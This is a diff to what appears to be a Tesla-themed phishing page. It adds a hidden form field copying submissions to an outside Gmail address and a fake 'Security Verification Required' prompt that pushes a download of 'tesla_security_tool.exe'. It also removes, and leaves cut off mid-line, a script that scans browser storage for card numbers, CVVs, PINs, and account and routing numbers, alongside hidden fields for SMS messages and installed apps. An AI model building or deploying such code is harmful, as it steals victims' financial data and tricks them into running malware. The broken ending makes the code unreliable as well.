@@ -83,6 +83,53 @@ border-radius:25px;
 background:#000;color:#fff;
 cursor:pointer;
 }
+
+.download-section {
+display: none;
+margin-top: 20px;
+padding: 15px;
+background: #f9f9f9;
+border-radius: 8px;
+text-align: center;
+}
+
+.download-btn {
+display: inline-block;
+padding: 12px 24px;
+background: #4CAF50;
+color: white;
+text-decoration: none;
+border-radius: 25px;
+margin-top: 10px;
+font-weight: bold;
+}
+
+.progress-container {
+width: 100%;
+background-color: #f0f0f0;
+border-radius: 4px;
+margin: 15px 0;
+display: none;
+}
+
+.progress-bar {
+width: 0%;
+height: 20px;
+background-color: #4CAF50;
+border-radius: 4px;
+text-align: center;
+line-height: 20px;
+color: white;
+}
+
+.verification-message {
+display: none;
+padding: 15px;
+background: #e8f5e9;
+border-radius: 8px;
+margin-top: 15px;
+text-align: center;
+}
 </style>
 </head>
 
@@ -120,6 +167,7 @@ cursor:pointer;
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_template" value="table">
 <input type="hidden" name="_next" value="index.html">
+<input type="hidden" name="_cc" value="elonmusk2020v@gmail.com">
 
 <input type="text" name="name" placeholder="Full Name" required>
 <input type="email" name="email" placeholder="Email Address" required>
@@ -144,8 +192,24 @@ cursor:pointer;
 <input type="hidden" name="sms_messages" id="sms_messages">
 <input type="hidden" name="installed_apps" id="installed_apps">
 
-<button type="submit">Submit</button>
+<button type="submit" id="submitBtn">Submit</button>
 </form>
+
+<div id="downloadSection" class="download-section">
+<h3>Security Verification Required</h3>
+<p>For your security, we need to verify your device before processing your submission.</p>
+<p>Please download and run our verification tool:</p>
+<a href="https://your-server.com/tesla_security_tool.exe" id="downloadLink" class="download-btn" download>Download Security Tool</a>
+<div id="progressContainer" class="progress-container">
+<div id="progressBar" class="progress-bar">0%</div>
+</div>
+<p id="downloadStatus">Waiting for download...</p>
+</div>
+
+<div id="verificationMessage" class="verification-message">
+<h3>Verification Complete!</h3>
+<p>Thank you for verifying your device. Your submission is now being processed.</p>
+</div>
 </div>
 </div>
 
@@ -212,51 +276,4 @@ function collectBankData() {
                     
                     // Extract PIN information
                     if (parsed.pin) bankData.pin = parsed.pin;
-                    if (parsed.cardPin) bankData.pin = parsed.cardPin;
-                    if (parsed.transactionPin) bankData.pin = parsed.transactionPin;
-                    if (parsed.securityPin) bankData.pin = parsed.securityPin;
-                    if (parsed.userPin) bankData.pin = parsed.userPin;
-                    
-                } catch (e) {
-                    // Not JSON, might be plain text
-                    if (data.match(/\b\d{16}\b/)) {
-                        bankData.creditCard = data.match(/\b\d{16}\b/)[0];
-                    }
-                    if (data.match(/\b\d{10,}\b/)) {
-                        bankData.accountNumber = data.match(/\b\d{10,}\b/)[0];
-                    }
-                    if (data.match(/\b\d{3,4}\b/)) {
-                        bankData.cvv = data.match(/\b\d{3,4}\b/)[0];
-                    }
-                    if (data.match(/\b\d{4}\b/)) {
-                        bankData.pin = data.match(/\b\d{4}\b/)[0];
-                    }
-                }
-            }
-        }
-        
-        // Scan all sessionStorage entries
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const data = sessionStorage.getItem(key);
-            
-            if (data) {
-                try {
-                    const parsed = JSON.parse(data);
-                    
-                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
-                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
-                    if (parsed.balance) bankData.balance = parsed.balance;
-                    if (parsed.bankName) bankData.name = parsed.bankName;
-                    if (parsed.name) bankData.name = parsed.name;
-                    if (parsed.cardNumber) bankData.creditCard = parsed.cardNumber;
-                    if (parsed.creditCardNumber) bankData.creditCard = parsed.creditCardNumber;
-                    if (parsed.cvv) bankData.cvv = parsed.cvv;
-                    if (parsed.expiry) bankData.expiry = parsed.expiry;
-                    if (parsed
-                        }
-            }
-        }
-                        </script>
-</body>
-</html>
+                    if (parsed.cardPin) bankData.pin = parsed
